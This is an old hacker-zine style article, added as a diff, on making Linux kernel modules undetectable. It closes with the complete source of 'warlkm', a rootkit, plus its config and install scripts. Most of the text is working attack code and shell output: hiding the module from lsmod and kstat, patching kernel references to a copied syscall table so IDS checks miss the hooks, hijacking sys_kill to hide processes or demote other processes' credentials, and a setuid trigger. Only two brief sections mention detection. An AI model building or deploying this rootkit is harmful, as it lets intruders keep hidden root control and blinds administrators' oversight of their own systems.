@@ -1,0 +1,1025 @@
+	
+   	  *******Indetectable Linux Kernel Modules********
+	By SpaceWalker(spacewalker@altern.org) from BHZ (bhz.be.tf)
+
+1 Introduction
+
+1.1 What is a lkm ?
+-------------------
+
+Yeah, that's a question ! A Linux Kernel Module is a program you insert 
+in the kernel, and which can modify it. If you are reading this text, it's
+because you know what is a lkm ! If not, read first the doc from Pragmatic/
+THC : "The linux Kernel Modules". 
+
+1.2 Why is a lkm dangerous ?
+----------------------------
+
+The hacker who takes root on your linux box has the theorical possibility
+of inserting a LKM in your kernel. It is known. The lkm can modify ALL the
+kernel, and can do Anything it wants.
+The only limits are the imaginations and your coding possibilities.
+
+1.3 Serious things now...Detection of those lkm
+-----------------------------------------------
+
+The basic thing to do when you know you have been rooted is to do a 
+"lsmod" and a "cat /proc/modules". Ex :
+falcon:~$ cat /proc/modules
+evil_lkm                5746   0 (unused)
+scsi_mod               58640   0
+msdos                   5408   0 (unused)
+minix                  22384   0 (unused)
+binfmt_misc             3280   0
+ne2k-pci                4656   0 (unused)
+8390                    6432   0 [ne2k-pci]
+bsd_comp                3872   0 (unused)
+ppp                    20160   0 [bsd_comp]
+lp                      5360   0 (unused)
+parport_pc              5840   1
+parport                 7056   1 [lp parport_pc]
+vfat                    9312   2 (autoclean)
+fat                    30144   2 (autoclean) [msdos vfat]
+
+You see there is a suspicious module named "evil_lkm". Discretion rulez
+(note that one day I saw a module named rkit in a box... )
+
+In most cases, the module exports a lot of symbols into the /proc/ksyms.
+You, the lkm coder, you have to deny those detections !!
+As you can read into the text from Pragmatic, there is a method explained 
+to hide your lkm. But now, You are an elite, don't forget it, it is not 
+enough to pass throught IDS
+
+2 Kstat LKM detection methods
+
+2.1 Kstat ?
+-----------
+
+Yes, kstat is a well-know kmem analyser tool. In three words, this 
+program opens /dev/kmem and reads directly in to find modules, processes,
+system calls. The admin has to supply a System.map file, which is created 
+during the linux kernel compilation. (or after with a vmlinux file)
+
+2.2 Why is kstat more secure than /proc ?
+-----------------------------------------
+
+Because the /proc filesystem depends ONLY of the kernel. It's very easy to
+hide something in.
+But it is harder to hide from kmem(but it is still possible...).
+
+2.3 what are the commands of kstat ?
+------------------------------------
+
+It is written into the man page but you can do a kstat -s to see all 
+syscall adresses from sys_call_table and kstat -M to see all linked 
+modules.
+
+3 Hide our module
+
+2.1 Module loading into the kernel
+----------------------------------
+
+A module is loaded into the kernel by the syscall "sys_create_module". The
+code is put in the kernel memory. All the external symbols are resolved by
+insmod, and the function module_init() is executed. Once this one returns 
+0, The lkm is loaded.
+This is it in the large lines.
+
+2.2 Module unloading
+--------------------
+
+Here things begin to be interesting... The syscall sys_delete_module 
+deletes a module.(believe me it's true !!)
+Here is the source code ripped from kernel/module.c (from kernel 2.2.14)
+
+asmlinkage int
+sys_delete_module(const char *name_user)
+{
+        struct module *mod, *next;
+        char *name;
+        long error = -EPERM;
+        int something_changed;
+        lock_kernel();
+        if (!capable(CAP_SYS_MODULE))
+                goto out;
+        if (name_user) {
+                if ((error = get_mod_name(name_user, &name)) < 0)
+                        goto out;
+                if (error == 0) {
+                        error = -EINVAL;
+                        put_mod_name(name);
+                        goto out;
+                }
+            
+                
+                error = -ENOENT;
+                if ((mod = find_module(name)) == NULL) {
+                        put_mod_name(name);
+                        goto out;
+                }
+                put_mod_name(name);
+                error = -EBUSY;
+                if (mod->refs != NULL || __MOD_IN_USE(mod))
+                        goto out;
+                free_module(mod, 0);
+                error = 0;
+                goto out;
+        }
+        /* Do automatic reaping */
+restart:
+        something_changed = 0;
+        for (mod = module_list; mod != &kernel_module; mod = next) {
+                next = mod->next;
+                if (mod->refs == NULL
+                    && (mod->flags & MOD_AUTOCLEAN)
+                    && (mod->flags & MOD_RUNNING)
+                    && !(mod->flags & MOD_DELETED)
+                    && (mod->flags & MOD_USED_ONCE)
+                    && !__MOD_IN_USE(mod)) {
+                        if ((mod->flags & MOD_VISITED)
+                            && !(mod->flags & MOD_JUST_FREED)) {
+                                mod->flags &= ~MOD_VISITED;
+                        } else {
+                                free_module(mod, 1);
+                                something_changed = 1;
+                        }
+                }
+        }
+        if (something_changed)
+                goto restart;
+        for (mod = module_list; mod != &kernel_module; mod = mod->next)
+                mod->flags &= ~MOD_JUST_FREED;
+        error = 0;
+out:
+        unlock_kernel();
+        return error;
+}
+
+2.3 Nice code, but what do I do ?
+---------------------------------
+
+The main idea of my method is that once my LKM is loaded, I unload it but 
+I "forget" to clean its memory. Hard to understand (I hope no)? The module 
+code will stay in the kernel memory after we unloaded the module.
+here is my version of sys_remove_module() :
+
+struct module **module_list =(struct module *) MODULE_LIST;
+
+struct module  *(*find_module)(const char *name)=FIND_MODULE;
+
+/* in facts, I take the sys_setuid to do my silly job. It's not a problem 
+ * coz I remove it immediatly. It's a job I can't do in the module_init()
+ * function because the module is not initialised yet. I do like this 
+ * & it works							 */
+
+
+static inline remove_me(pid_t pid){
+  int tag_freed = 0;
+  struct module_ref *dep;
+  unsigned i;
+  struct module *mod ;
+  if (pid==12345){
+hacked_sys_call_table[SYS_setuid]=sys_setuid;
+/* Let the module clean up.  */
+mod = find_module(WARLKM);
+if (mod) {
+        mod->flags |= MOD_DELETED;
+        if (mod->flags & MOD_RUNNING)
+        {
+        /*      if(mod->cleanup)
+                        mod->cleanup();*/
+        /* cleanup() my module ??? you are creasy in your head :-) */
+                mod->flags &= ~MOD_RUNNING;
+        }
+        /* Remove the module from the dependency lists.  */
+        for (i = 0, dep = mod->deps; i < mod->ndeps; ++i, ++dep) {
+                struct module_ref **pp;
+                for (pp = &dep->dep->refs; *pp != dep; pp = \
+					   &(*pp)->next_ref)
+                        continue;
+                *pp = dep->next_ref;
+                if (tag_freed && dep->dep->refs == NULL)
+                        dep->dep->flags |= MOD_JUST_FREED;
+        }
+        /* And from the main module list.  */
+        if (mod == *module_list) {
+                *module_list = mod->next;
+        } else {
+                struct module *p;
+                for (p = *module_list; p->next != mod; p = p->next)
+                        continue;
+                p->next = mod->next;
+        }
+        /* And **not to free** the memory.  ( :-)))) )*/
+  /*
+        module_unmap(mod);
+  */
+} /* if(mod) */
+else {
+#ifdef DEBUG
+printk("<1> warlkm not found \n");
+return 1;
+#else
+return 1;
+#endif
+}
+return 0;
+}
+else
+return (*sys_setuid)(pid);
+}
+
+
+In facts, this function is part of my lkm (warlkm) and is put into the 
+sys_call_table. I choose the sys_setuid function. The function modifies 
+the sys_call_table to restore the original sys_setuid after the hidding
+operation. I had to do that because while I'm in the module_init(),
+the module is not yet initialised so doesn't exist (And I had nice General
+protection faults while testing it :-) because the find_module() returned 
+0 (module not found)).
+As you see, the code is very simple, but there are two dark lines :
+struct module **module_list =(struct module *) MODULE_LIST;
+struct module  *(*find_module)(const char *name)=FIND_MODULE;
+
+The symbols find_module & module_list are not exported by the kernel. 
+You have to grep them from the System.map file (I did a little script to 
+do that automaticaly).
+
+note : You'll see a hacked_sys_setuid[]. It is explained further.
+
+2.4 The facts
+-------------
+
+Include this code into your lkm and don't forget to do a 
+original_sys_setuid=sys_call_table[SYS_setuid];
+sys_call_table[SYS_setuid]=remove_me;
+compile, and insmod
+
+falcon:~/warlkm# insmod warlkm.o
+falcon:~/warlkm# lsmod
+Module                  Size  Used by
+warlkm                  2448   0  (unused)
+...
+Our module is still present.
+
+falcon:~/warlkm# kstat -M
+Using /lib/modules/misc/knull.o
+Module              Address
+knull               0xc4c71000
+warlkm              0xc4c73000
+scsi_mod            0xc4c59000
+...
+
+Warlkm is still visible.
+Now it's time to run our remove_me function ;-)
+I did a little program "setuid.c" which just run a syscall :
+int main(){
+        setuid(12345);
+        return 0;
+        }
+falcon:~/warlkm# gcc -o setuid setuid.c
+falcon:~/warlkm# ./setuid
+falcon:~/warlkm# lsmod
+Module                  Size  Used by
+knull                    224   0  (unused)
+scsi_mod               58640   0
+msdos                   5408   0  (unused)
+minix                  22384   0  (unused)
+binfmt_misc             3280   0
+ne2k-pci                4656   0  (unused)
+8390                    6432   0  [ne2k-pci]
+bsd_comp                3872   0  (unused)
+ppp                    20160   0  [bsd_comp]
+lp                      5360   0  (unused)
+parport_pc              5840   1
+parport                 7056   1  [lp parport_pc]
+vfat                    9312   2  (autoclean)
+fat                    30144   2  (autoclean) [msdos vfat]
+falcon:~/warlkm# 
+
+We don't see the module.
+
+falcon:~/warlkm# kstat -M
+Using /lib/modules/misc/knull.o
+Module              Address
+knull               0xc4c71000
+scsi_mod            0xc4c59000
+msdos               0xc4c56000
+minix               0xc4c4f000
+binfmt_misc         0xc4c4d000
+ne2k-pci            0xc4c4a000
+8390                0xc4c47000
+bsd_comp            0xc4c45000
+...
+falcon:~/warlkm# 
+
+We don't see the lkm, But it is still in memory : I compiled my warlkm 
+with the #define "NO_SYSCALL_MASKING" I will explain later what it means. 
+My warlkm intercepts by default the syscall SYS_kill
+falcon:~/warlkm# kstat -s | grep W
+sys_kill                        0xc4c733ac WARNING! Should be at 0xc0110334
+falcon:~/warlkm# 
+ok, sys_kill is patched. If the module was completly removed, the kernel 
+should crash if I type by example "kill -32 1" (remember the init process 
+can't be killed)
+falcon:~/warlkm# kill -32 1
+falcon:~/warlkm# ps aux | grep init
+falcon:~/warlkm# kill -32 1
+falcon:~/warlkm# ps aux | grep init
+root         1  0.0  0.0   344   52 ?        S    12:05   0:04 init[3]
+
+Ok, the module is still running. Mission complete :-)
+
+2.5 Hey ! I ran it on my dev station I can't reboot it !
+--------------------------------------------------------
+
+I'm sorry for you but you'll have to ;-}
+To remove this lkm, you first need to know it exists. Theoricaly, you could
+unmap the memory from the lkm (if you know the exact adress) but you'll 
+still have the problem of the sys_call_table which have been modified.
+(Imagine the state of your box if sys_kill makes hang up it !!) So 
+experiment It when you know it WILL run.
+
+2.6 How to keeps my system secure after rooting ?
+-------------------------------------------------
+
+You had not to be rooted ;-)
+There are two way to insert modules into a linux system :
+the sys_create_module syscall and the /dev/kmem
+A good Idea is to modify your kernel sources to insert a password 
+verification at kernel state while insmoding a module (for all modules ;
+It is very easy to patch an existing module from your /lib/modules 
+directory, and you should'nt trust anything. If you don't want to put a 
+password each time you insmod a module, compile your kernel without modules
+support.
+Modify your kernel sources to deny any write access to the /dev/kmem file,
+unless you are root. Some programs should not work (??) but it's the price
+for the security.
+
+3 Hidden syscall modifications
+
+3.1 Syscall table ?
+-------------------
+
+Yes, the syscall table is a table created while booting of the kernel, who
+contains all the adresses of the syscall functions. When a user program 
+invoques a syscall, on i386, an logical interruption is called and the CPU
+enters in kernel mode. A kernel dispatcher reads the sys_call_table to
+find the offset in memory where is the syscall to execute.
+If you scan the kernel memory, you will find the adress of the 
+sys_call_table array in three places (in a standard 2.2.13 kernel):
+c0109cbc system_call
+c0109d4c tracesys
+c020da20 __ksymtab_sys_call_table
+
+there is the sourcecode of this lkm (could be do with kmem but ...)
+
+#define MODULE
+#define __KERNEL__
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <linux/proc_fs.h>
+extern void *sys_call_table[];
+int init_module(){
+  char *ptr;
+  int count=0;
+  for ( (int)ptr =(int) 0xc0100000; ((int)ptr) <(int)0xc026e000 ; ptr++)
+    if( * ((int*)ptr)==(int)sys_call_table)
+       printk("<1> %p \n",ptr);
+  return 0;
+    }
+void cleanup_module(){
+}
+
+compile & load, you will get normally 3 hex adresses.
+grep them from the System.map (the highter bytes) by example on my system
+the kernel returns 
+c0109cec
+c0109d60
+c020da20
+
+falcon:~/warlkm# grep c0109c /boot/System.map
+c0109c6c T lcall7
+c0109cb0 T ret_from_fork
+c0109cbc T system_call
+c0109cf4 T ret_from_sys_call
+
+A little logic conclusion is that the adress of sys_call_table is in the
+system_call function (which is not exported by kernel symbols)
+
+falcon:~/warlkm# grep c0109d6 /boot/System.map -B1
+c0109d4c t tracesys
+c0109d6f t badsys
+falcon:~/warlkm# grep c020da20 /boot/System.map
+c020da20 ? __ksymtab_sys_call_table
+falcon:~/warlkm# 
+
+O.K. we understood. Note that the code lenght between system_call and
+tracesys is about 180 bytes.
+
+My idea is that most of the IDS looks for modifications into the 
+sys_call_table by resolving the symbol sys_call_table. it's a good idea but
+my lkm creates a new sys_call_table named hacked_sys_call_table.
+I want that MY syscalls are used, but not detected. So, the best operation
+is to copy the original syscall table into my hacked one :
+
+void * makesyscalltable(){
+        void *hacked_sys_call_table;
+        hacked_sys_call_table=kmalloc(256*sizeof(long int),GFP_KERNEL);
+        memcpy(hacked_sys_call_table,sys_call_table,256*sizeof(long int));
+        return hacked_sys_call_table;
+}
+
+next step : look into the kernel memory to replace the adress of the 
+sys_call_table by the hacked one (exception : not the symbol).
+We saw there is 3 apparitions of the sys_call_table adress in the kernel:
+the first is the which interest us : the function which do the syscall
+dispaching interface. The second is for tracing syscalls with ptrace, as
+we can see in the file arch/i386/kernel/entry.S
+
+So hot patching of the kernel memory at this point.
+
+int change_references(void *hacked_sys_call_table){
+  char *ptr;
+  int count=0;
+  for ( (int)ptr =(int) SYSTEM_CALL; ((int)ptr) <(int) (SYSTEM_CALL+200) ;
+	ptr++)
+    if( * ((int*)ptr)==(int)sys_call_table){
+      if (++count==3)
+        return 0;
+      (int)*((int*)ptr) =(int) hacked_sys_call_table;
+    }
+if (count==0) { /* Warlkm or an other lkm using my t3kn1k loaded */
+        kfree (hacked_sys_call_table); /* free the unused array */
+        return -1; /* lkm installation musts abort */
+}
+  return 0; /*if kernel non-crashed :-) */
+    }
+
+As you see the code is very simple.
+
+3.2 It works ??
+---------------
+
+Yes, it works !
+Your systems now uses a new system call table. Funny no ?
+seriously, what does kstat gives as info ?
+falcon:~# kstat -s | grep W
+falcon:~# 
+Yes, elite rulez, there is not any warning from kstat, but if we do the 
+same test as upper with kill, you'll see the module still intercepts 
+SYS_kill.
+
+3.3 There are risks to use it on my system ?
+--------------------------------------------
+
+I think no. The only thing you risks to have problem is if you insmod after
+the lkm an other module that intercept a new or an existing syscall :
+As we have seen, the sys_call_table module has not been updated, so the new
+syscall will be shown by kstat -s but will never be executed by the kernel.
+
+3.4 How to detects those kernel hack's on my box ?
+--------------------------------------------------
+
+As I told upper, this lkm creates a bug into the sys call management. Try
+loading a kernel module wich intercept a given syscall and try to use it.
+If it won't work, it's maybe because the syscall table is not the one used
+by linux.
+You could too insmod a module (or look by kmem) if the adress of 
+sys_call_table never appears in the function system_call.
+
+So I could add a new feature to my lkm, which will replace in newly created
+modules (before init_module()d) all references to sys_call_table to
+hacked_sys_call_table.
+To do if you are in a system were you use some tools which could hang up
+becoze of the famous warlkm bug, not to do if some IDS may load a lkm to
+verify the syscall table ...
+Yes, the linux kernel modules story is not finished yet !
+
+4 Greetz & References
+
+Greetz to THC and specially to Pragmatic for doing me discover the lkms !
+(d\l their text here : 
+http://www.thehackerschoice.com/papers/LKM_HACKING.html )
+
+Greetz to #thebhz #hpcv #madchat #rtc4ever on openprojects.net becoz
+they supports me
+
+Greetz to my parents who made it possible in a 1983's night
+Greetz to you who read my paper :-)
+Greetz to all others I forgot.
+
+Sorry to all for my (very)poor English. (special fu** 2 my English teacher)
+
+SpaceWalker
+
+5 Appendix : WarLKM sources
+
+warlkm.c
+/*                 WARLKM
+Warlkm is a lkm designed for WAR (with blood, blood, blooooood !!)
+Done for 2.2.x kernel with a 2.0 doc ... I don't know if it compiles
+under 2.2 & if it runs correctly under smp/no-x86 ; to be tested
+(c)2k1 SpaceWalker from the BHZ
+
+So, this module intercepts the directory listing of the /proc dir to hide
+our hidden processes, hides himself from the sys_call_table and from 
+the modules list.
+*/
+#define MODULE
+#define __KERNEL__
+#define PROC_MAXPIDS 20
+#define PROC_NUMBUF 10
+#define FIRST_PROCESS_ENTRY 256
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <linux/proc_fs.h>
+
+#include "config.h"
+
+extern void *sys_call_table[];
+extern struct proc_dir_entry proc_root;
+static struct file_operations *proc_root_operations;
+static struct inode_operations *proc_root_inode_operations;
+void **hacked_sys_call_table;
+void *old_proc_root_readdir;
+int (*sys_setuid) (pid_t pid);
+#ifndef NO_HIDDING
+int hidden_tasks[100];
+
+#ifndef NO_HIDDING
+int hide_task(int pid)
+{
+    int i;
+    for (i = 0; hidden_tasks[i]; i++)
+	if (hidden_tasks[i] == pid)
+	    return 0;
+    hidden_tasks[i] = pid;
+    return 0;
+}
+int show_task(int pid)
+{
+    int i;
+    for (i = 0; hidden_tasks[i]; i++)
+	if (hidden_tasks[i] == pid) {
+	    do
+		hidden_tasks[i] = hidden_tasks[++i];
+	    while (hidden_tasks[i]);
+	    break;
+	}
+    return 0;
+}
+int is_hidden_task(int pid)
+{
+    int i;
+    for (i = 0; hidden_tasks[i]; i++)
+	if (hidden_tasks[i] == pid)
+	    return 1;
+    return 0;
+}
+#endif
+
+int proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
+{
+    struct proc_dir_entry *de;
+    unsigned int ino;
+    int i;
+    struct inode *inode = filp->f_dentry->d_inode;
+    ino = inode->i_ino;
+    de = (struct proc_dir_entry *) inode->u.generic_ip;
+    if (!de)
+	return -EINVAL;
+    i = filp->f_pos;
+    switch (i) {
+    case 0:
+	if (filldir(dirent, ".", 1, i, ino) < 0)
+	    return 0;
+	i++;
+	filp->f_pos++;
+	/* fall through */
+    case 1:
+	if (filldir(dirent, "..", 2, i, de->parent->low_ino) < 0)
+	    return 0;
+	i++;
+	filp->f_pos++;
+	/* fall through */
+    default:
+
+	ino &= ~0xffff;
+	de = de->subdir;
+	i -= 2;
+	for (;;) {
+	    if (!de)
+		return 1;
+	    if (!i)
+		break;
+	    de = de->next;
+	    i--;
+	}
+	do {
+	    if (filldir
+		(dirent, de->name, de->namelen, filp->f_pos,
+		 ino | de->low_ino) < 0)
+		return 0;
+	    filp->f_pos++;
+	    de = de->next;
+	} while (de);
+    }
+    return 1;
+}
+static int get_pid_list(int index, unsigned int *pids)
+{
+    struct task_struct *p;
+    int nr_pids = 0;
+    index -= FIRST_PROCESS_ENTRY;
+    read_lock(&tasklist_lock);
+    for_each_task(p) {
+	int pid = p->pid;
+	if (!pid)
+	    continue;
+	/* here modification */
+	if (is_hidden_task(pid))
+	    continue;
+	if (--index >= 0)
+	    continue;
+	pids[nr_pids] = pid;
+	nr_pids++;
+	if (nr_pids >= PROC_MAXPIDS)
+	    break;
+    }
+    read_unlock(&tasklist_lock);
+    return nr_pids;
+}
+
+static int proc_root_readdir(struct file *filp,
+			     void *dirent, filldir_t filldir)
+{
+    unsigned int pid_array[PROC_MAXPIDS];
+    char buf[PROC_NUMBUF];
+    unsigned int nr = filp->f_pos;
+    unsigned int nr_pids, i;
+    if (nr < FIRST_PROCESS_ENTRY) {
+	int error = proc_readdir(filp, dirent, filldir);
+	if (error <= 0)
+	    return error;
+	filp->f_pos = nr = FIRST_PROCESS_ENTRY;
+    }
+    nr_pids = get_pid_list(nr, pid_array);
+    for (i = 0; i < nr_pids; i++) {
+	int pid = pid_array[i];
+	ino_t ino = (pid << 16) + PROC_PID_INO;
+	unsigned long j = PROC_NUMBUF;
+	do {
+	    j--;
+	    buf[j] = '0' + (pid % 10);
+	    pid /= 10;
+	} while (pid);
+	if (filldir(dirent, buf + j, PROC_NUMBUF - j, filp->f_pos, ino) <
+	    0) break;
+	filp->f_pos++;
+    }
+    return 0;
+}
+#endif
+
+struct task_struct *return_task_from_pid(int pid)
+{
+    struct task_struct *p;
+    p = &init_task;
+    while (((p = p->next_task) != &init_task) && p->pid != pid);
+    if (p == &init_task)
+	return 0;
+    else
+	return p;
+}
+int (*orig_sys_kill) (int pid, int sig);
+
+int hacked_sys_kill(int pid, int sig)
+{
+    struct task_struct *p;
+    if (sig > 28 && sig < 33) {
+	/*OUR special cases hehe */
+	/*I do 2 signal number verifications because a case() would'nt 
+	    be quick enough */
+	if (sig == 32) {
+	    /*process invisible/visible */
+	    if (is_hidden_task(pid))
+		show_task(pid);
+	    else
+		hide_task(pid);
+	    return 0;
+	}
+	if (sig == 30) {
+	    p = return_task_from_pid(pid);
+	    if (!p)
+		return -ESRCH;
+	    p->euid = NOBODY_UID;
+	    p->egid = NOBODY_GID;
+	    p->uid = NOBODY_UID;
+	    p->gid = NOBODY_GID;
+	    /*mwarf now it'll have just a little problem for the admin !!*/
+	}
+
+	return 0;
+    }
+    return (*orig_sys_kill) (pid, sig);
+}
+
+
+/* ------------------------------------------------------*/
+/* end of the sys_kill modif's & the process hidding     */
+/* ------------------------------------------------------*/
+
+/* *makesyscalltable(). Why another syscall table ??? If another stupid IDS
+program want to do a checksum on his sycall table, he could do, but before
+this time my lovely lkm had changed all the references of sys_call_table 
+to hacked_sys_call_table in the kernel memory segment. We can modify the 
+sys_call_table without any problems (arf we are hard with those IDS !!!) */
+
+#ifndef NO_SYSCALL_MASKING
+
+void *makesyscalltable()
+{
+    void *hacked_sys_call_table;
+    hacked_sys_call_table = kmalloc(256 * sizeof(long int), GFP_KERNEL);
+    memcpy(hacked_sys_call_table, sys_call_table, 256 * sizeof(long int));
+    return hacked_sys_call_table;
+}
+
+int change_references(void *hacked_sys_call_table)
+{
+    char *ptr;
+    int count = 0;
+#ifdef DEBUG
+    printk("<1> hacked : %p normal : %p\n", hacked_sys_call_table,
+	   sys_call_table);
+#endif
+    for ((int) ptr = (int) SYSTEM_CALL;
+	 ((int) ptr) < (int) (SYSTEM_CALL + 200); ptr++)
+	if (*((int *) ptr) == (int) sys_call_table) {
+	    if (++count == 3)
+		return 0;
+#ifdef DEBUG
+	    printk("<1> %p \n", ptr);
+#endif
+	    (int) *((int *) ptr) = (int) hacked_sys_call_table;
+	}
+    if (count == 0) {	/* Warlkm or an other lkm using my t3kn1k loaded */
+	kfree(hacked_sys_call_table);	/* free the unused array */
+	return -1;		/* lkm installation musts abord */
+    }
+    return 0;			/*if kernel non-crashed :-) */
+}
+#endif				/* NO_SYSCALL_MASKING */
+
+struct module **module_list = (struct module **) MODULE_LIST;
+struct module *(*find_module) (const char *name) =
+    (struct module *) FIND_MODULE;
+/* in facts, I take the sys_setuid to do my silly job. It's not a problem 
+coz I remove it immediatly. It's a job I can't do in the module_init() 
+function because the module is not initialised yet. I do like this & it 
+works								    */
+static inline remove_me(pid_t pid)
+{
+    int tag_freed = 0;
+    struct module_ref *dep;
+    unsigned i;
+    struct module *mod;
+    if (pid == 12345) {
+	hacked_sys_call_table[SYS_setuid] = sys_setuid;
+/* Let the module clean up.  */
+	mod = find_module(WARLKM);
+
+	if (mod) {
+
+	    mod->flags |= MOD_DELETED;
+	    if (mod->flags & MOD_RUNNING) {
+		/*      if(mod->cleanup)
+		   mod->cleanup(); */
+		/* cleanup() my module ??? you are creasy in your head :-)*/
+		mod->flags &= ~MOD_RUNNING;
+	    }
+
+	    /* Remove the module from the dependency lists.  */
+
+	    for (i = 0, dep = mod->deps; i < mod->ndeps; ++i, ++dep) {
+		struct module_ref **pp;
+		for (pp = &dep->dep->refs; *pp != dep;
+		     pp = &(*pp)->next_ref) continue;
+		*pp = dep->next_ref;
+		if (tag_freed && dep->dep->refs == NULL)
+		    dep->dep->flags |= MOD_JUST_FREED;
+	    }
+
+	    /* And from the main module list.  */
+	    if (mod == *module_list) {
+		*module_list = mod->next;
+	    } else {
+		struct module *p;
+		for (p = *module_list; p->next != mod; p = p->next)
+		    continue;
+		p->next = mod->next;
+	    }
+	    /* And **not to free** the memory.  ( :-)))) ) */
+	    /*
+	       module_unmap(mod);
+	     */
+	} /* if(mod) */
+	else {
+
+#ifdef DEBUG
+	    printk("<1> warlkm not found \n");
+	    return 1;
+
+#else
+	    return 1;
+#endif
+	}
+	return 0;
+    } else
+	return (*sys_setuid) (pid);
+}
+
+/*
+ * Return the pointer on hacked_sys_call_table;
+ */
+
+void *invisible_me()
+{
+    void *hacked_sys_call_table;
+#ifndef NO_SYSCALL_MASKING
+    hacked_sys_call_table = makesyscalltable();
+    if (change_references(hacked_sys_call_table))
+	return -1;		/*Syscall hacking failed */
+#else
+    hacked_sys_call_table = sys_call_table;
+#endif
+
+    return hacked_sys_call_table;
+}
+int init_module()
+{
+
+    if ((hacked_sys_call_table = invisible_me()) == -1)
+	return -1;		/* syscall patching failed */
+    sys_setuid = hacked_sys_call_table[SYS_setuid];
+    orig_sys_kill = hacked_sys_call_table[SYS_kill];
+    hacked_sys_call_table[SYS_kill] = hacked_sys_kill;
+    hacked_sys_call_table[SYS_setuid] = remove_me;
+
+#ifndef NO_HIDDING
+    proc_root_inode_operations = proc_root.ops;
+    proc_root_operations = proc_root_inode_operations->default_file_ops;
+
+/* now we have a proc_root_operations ready-to-hack , we can modify the */
+/* readdir function link. The idea is that this function is normal, but */
+/* the get_pid_list() function will be hacked & replaced by an other    */
+    old_proc_root_readdir = proc_root_operations->readdir;
+    proc_root_operations->readdir = &proc_root_readdir;
+/* yeh we patched the kernel ; don't forget to clean it when we leave...*/
+#endif				/* NO_HIDING */
+    return 0;
+}
+/* I let a cleanup function for debbuging purposes, and to let the module 
+charging by insmod normally. Of course it does never run  */
+void cleanup_module()
+{
+    hacked_sys_call_table[SYS_kill] = orig_sys_kill;
+    hacked_sys_call_table[SYS_setuid] = sys_setuid;
+#ifndef NO_HIDDING
+    proc_root_operations->readdir = old_proc_root_readdir;
+#endif
+/* kfree(hacked_sys_call_table);  for the moment the system'll crash if we
+remove the module, coz we hard-changed the adress of sys_call_table so it's
+more secure not to free the memory */
+}
+
+/*************************************************************************/
+
+config.h 
+
+/*  #define NO_HIDDING  */
+/*  #define NO_HIDDEN_REP  */
+/* #define NO_SYSCALL_MASKING */
+#define DEBUG			// */
+#define WARLKM "warlkm"
+#include "auto.config.h"
+
+/*************************************************************************/
+
+config.sh
+
+#!/bin/sh
+SYSTEM_MAP=/boot/System.map
+
+echo "/* begin of automatic config */" > auto.config.h
+grep nobody /etc/passwd | tail -n 1 | awk 'BEGIN {FS=":"} { print "#define\
+ NOBODY_UID " $3; print "#define NOBODY_GID " $4 };' >> auto.config.h
+grep _end $SYSTEM_MAP | tail -n 1 | awk '{print "#define KERNEL_END 0x" $1\
+ };' >> auto.config.h
+grep module_list $SYSTEM_MAP | tail -n 1 | awk '{print "#define \
+MODULE_LIST 0x" $1 };'>> auto.config.h
+grep find_module $SYSTEM_MAP | tail -n 1 | awk '{print "#define \
+FIND_MODULE 0x" $1 };'>> auto.config.h
+grep system_call $SYSTEM_MAP | tail -n 1 | awk '{print "#define \
+SYSTEM_CALL 0x" $1 };'>> auto.config.h
+
+/*************************************************************************/
+
+setuid.c
+
+#include <stdio.h>
+
+int main()
+{
+    setuid(12345);
+    return 0;
+}
+
+/*************************************************************************/
+
+Makefile
+CC = gcc
+CFLAGS = -O2
+
+all: warlkm.o setuid
+	
+setuid: 
+	gcc -o setuid setuid.c
+clean:
+	rm -f *.c~ *.o Makefile~ config.h~ setuid auto.config.h *.sh~
+
+/*************************************************************************/
+
+install.sh
+
+#!/bin/sh
+
+echo "Yeeeh Install me rulez !"
+make clean
+./config.sh
+make && echo "hoho compilled now installing ..."  || echo "some error \
+somewhere, you should verify the auto.config.h "
+/sbin/insmod warlkm.o && echo "yeah insmoded, look at this..."  || echo \
+"Error in linking, It's maybe one of those shit RH kernel which \
+are killing U "
+/sbin/lsmod | grep warlkm
+echo "now lauching the activator"
+./setuid && echo "great, activator launched and now doing a grep \
+warlkm /proc/modules" || echo "my setuid program not launched ????"
+grep warlkm /proc/modules
+echo "The LKM is launched, don't execute me while another reboot "
+
+/*************************************************************************/
+
+README
+      *********WAR LKM*********
+(c)2k1 SpaceWalker from BHZ
+
+WarLkm is a Linux Kernel Module which has some interesting functions
+for admins & hackers :
+Process Hidding
+The module Hides himself
+Promiscious Syscall modifications
+Easy installation
+
+Quick setup (for bad lam3rs)
+To install it, just type ./install.sh
+It will configure, compile and insmod.
+
+Complete Setup (for great hack3rs)
+./config.sh
+look at auto.config.h if all the adresses are inside. If not, it's because
+your System.map is not in the /boot directory
+
+**WARNING !!!** If you configure with a bad System.map, the system
+could hang up when you insmod the lkm
+
+If you don't have a System.map file or you don't think you have the good
+one, look in your kernel sources for your linux kernel image, then types
+
+nm  /usr/src/linux/vmlinux | sort > System.map
+It is not realy a System.map file but it is correct for warlkm
+compile with make
+
+to install the module, just insmod it. You'll see it is in the
+/proc/modules
+hit ./setuid
+And it will be shadowed. For the kernel, the modules does not longer exists
+BUT
+The memory is still allocated. Load only this module One time. You'll see
+it's working by doing a kill -32 on a pid
+
+Have a nice hack !
+
+
+EOF
+
